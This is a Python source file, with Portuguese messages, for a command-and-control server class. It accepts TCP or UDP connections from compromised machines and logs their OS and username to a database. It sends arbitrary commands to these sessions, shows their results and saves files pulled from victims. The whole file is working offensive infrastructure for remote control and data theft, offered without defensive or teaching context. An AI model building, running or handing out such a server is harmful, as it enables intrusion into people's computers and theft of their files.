import socket
import threading
import select
import time
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.panel import Panel

class C2Server:
    def __init__(self, config, db):
        self.config = config
        self.db = db
        self.host = config.get("LHOST")
        self.port = config.get("LPORT")
        self.protocol = config.get("PROTOCOL")
        self.clients = {}
        self.sessions = {}
        self.next_session_id = 1
        self.running = False
        self.server_socket = None
        self.console = Console()
        
    def start_server(self):
        try:
            if self.protocol.lower() == "tcp":
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                self.server_socket.bind((self.host, self.port))
                self.server_socket.listen(5)
            elif self.protocol.lower() == "udp":
                self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                self.server_socket.bind((self.host, self.port))
            else:
                self.console.print(f"[red]✗ Protocolo não suportado: {self.protocol}[/red]")
                return False
            
            self.running = True
            self.console.print(f"[green]✓ Servidor C2 iniciado em {self.host}:{self.port} ({self.protocol.upper()})[/green]")
            
            # Thread para aceitar conexões
            accept_thread = threading.Thread(target=self.accept_connections)
            accept_thread.daemon = True
            accept_thread.start()
            
            return True
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao iniciar servidor: {e}[/red]")
            return False
            
    def accept_connections(self):
        while self.running:
            try:
                if self.protocol.lower() == "tcp":
                    client_socket, client_address = self.server_socket.accept()
                    self.handle_tcp_connection(client_socket, client_address)
                elif self.protocol.lower() == "udp":
                    data, client_address = self.server_socket.recvfrom(1024)
                    self.handle_udp_connection(data, client_address)
                    
            except Exception as e:
                if self.running:
                    self.console.print(f"[red]✗ Erro ao aceitar conexão: {e}[/red]")
                    
    def handle_tcp_connection(self, client_socket, client_address):
        # Gerar ID de sessão
        session_id = f"tcp_{self.next_session_id}"
        self.next_session_id += 1
        
        # Adicionar à lista de clientes
        self.clients[session_id] = {
            'socket': client_socket,
            'address': client_address,
            'protocol': 'tcp',
            'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'last_seen': datetime.now(),
            'info': 'Desconhecido',
            'os': 'Desconhecido',
            'username': 'Desconhecido'
        }
        
        self.sessions[session_id] = client_socket
        
        self.console.print(f"[green]✓ Nova conexão TCP de {client_address[0]}:{client_address[1]} (Sessão: {session_id})[/green]")
        
        # Thread para lidar com o cliente
        client_thread = threading.Thread(
            target=self.handle_tcp_client, 
            args=(client_socket, client_address, session_id)
        )
        client_thread.daemon = True
        client_thread.start()
        
    def handle_udp_connection(self, data, client_address):
        session_id = f"udp_{client_address[0]}_{client_address[1]}"
        
        if session_id not in self.clients:
            # Nova conexão UDP
            self.clients[session_id] = {
                'address': client_address,
                'protocol': 'udp',
                'connected_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'last_seen': datetime.now(),
                'info': 'Desconhecido',
                'os': 'Desconhecido',
                'username': 'Desconhecido'
            }
            
            self.console.print(f"[green]✓ Nova conexão UDP de {client_address[0]}:{client_address[1]} (Sessão: {session_id})[/green]")
        
        # Atualizar último visto
        self.clients[session_id]['last_seen'] = datetime.now()
        
        # Processar dados
        try:
            decoded_data = data.decode('utf-8', errors='ignore')
            self.process_data(decoded_data, session_id)
        except:
            pass
            
    def handle_tcp_client(self, client_socket, client_address, session_id):
        try:
            while self.running:
                data = self.receive_tcp_data(client_socket, 0.5)
                if data is None:
                    continue
                if not data:
                    break
                    
                # Processar dados recebidos
                try:
                    decoded_data = data.decode('utf-8', errors='ignore')
                    self.process_data(decoded_data, session_id)
                except Exception as e:
                    self.console.print(f"[yellow]⚠️  Erro ao processar dados: {e}[/yellow]")
                    
        except Exception as e:
            self.console.print(f"[red]✗ Erro na sessão {session_id}: {e}[/red]")
        finally:
            self.remove_client(session_id)
            
    def process_data(self, data, session_id):
        if data.startswith("INFO:"):
            info = data[5:]
            self.clients[session_id]['info'] = info
            self.console.print(f"[cyan]ℹ️  Info da sessão {session_id}: {info}[/cyan]")
        
        elif data.startswith("OS:"):
            os_info = data[3:]
            self.clients[session_id]['os'] = os_info
        
        elif data.startswith("USER:"):
            user_info = data[5:]
            self.clients[session_id]['username'] = user_info
            # Adicionar ao banco de dados
            self.db.add_session(session_id, 
                               self.clients[session_id]['address'][0], 
                               self.clients[session_id]['os'],
                               user_info)
        
        elif data.startswith("RESULT:"):
            result = data[7:]
            self.console.print(f"[blue][Sessão {session_id}][/blue] [green]Resultado:[/green]\n{result}")
            
        elif data.startswith("FILE:"):
            # Processar upload de arquivo
            parts = data.split(":", 2)
            if len(parts) >= 3:
                filename = parts[1]
                filedata = parts[2]
                self.save_file(session_id, filename, filedata)
                
        else:
            self.console.print(f"[blue][Sessão {session_id}][/blue] {data}")
            
    def save_file(self, session_id, filename, filedata):
        import base64
        try:
            # Decodificar dados base64
            file_bytes = base64.b64decode(filedata)
            
            # Salvar arquivo
            downloads_dir = "downloads"
            import os
            os.makedirs(downloads_dir, exist_ok=True)
            
            filepath = f"{downloads_dir}/{session_id}_{filename}"
            with open(filepath, "wb") as f:
                f.write(file_bytes)
                
            self.console.print(f"[green]✓ Arquivo recebido: {filename} ({len(file_bytes)} bytes)[/green]")
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao salvar arquivo: {e}[/red]")
            
    def receive_tcp_data(self, sock, timeout=1):
        ready = select.select([sock], [], [], timeout)
        if ready[0]:
            try:
                data = sock.recv(65536)
                return data
            except:
                return None
        return None
        
    def remove_client(self, session_id):
        if session_id in self.clients:
            client_info = self.clients[session_id]
            self.console.print(f"[yellow]✗ Conexão fechada: Sessão {session_id} ({client_info['address'][0]})[/yellow]")
            
            try:
                if client_info['protocol'] == 'tcp':
                    client_info['socket'].close()
            except:
                pass
            
            del self.clients[session_id]
            if session_id in self.sessions:
                del self.sessions[session_id]
                
    def list_clients(self):
        if not self.clients:
            self.console.print("[yellow]Nenhum cliente conectado[/yellow]")
            return
            
        table = Table(title="Clientes Conectados")
        table.add_column("Sessão", style="cyan")
        table.add_column("Endereço", style="green")
        table.add_column("Protocolo", style="magenta")
        table.add_column("Usuário", style="yellow")
        table.add_column("Sistema")
        table.add_column("Conectado em")
        
        for session_id, client in self.clients.items():
            table.add_row(
                session_id,
                f"{client['address'][0]}:{client['address'][1]}",
                client['protocol'].upper(),
                client['username'],
                client['os'],
                client['connected_at']
            )
            
        self.console.print(table)
        
    def send_command(self, session_id, command):
        if session_id not in self.clients:
            self.console.print(f"[red]✗ Sessão não encontrada: {session_id}[/red]")
            return False
            
        client = self.clients[session_id]
        
        try:
            if client['protocol'] == 'tcp':
                client['socket'].send(command.encode())
            elif client['protocol'] == 'udp':
                self.server_socket.sendto(command.encode(), client['address'])
                
            return True
        except Exception as e:
            self.console.print(f"[red]✗ Erro ao enviar comando: {e}[/red]")
            return False
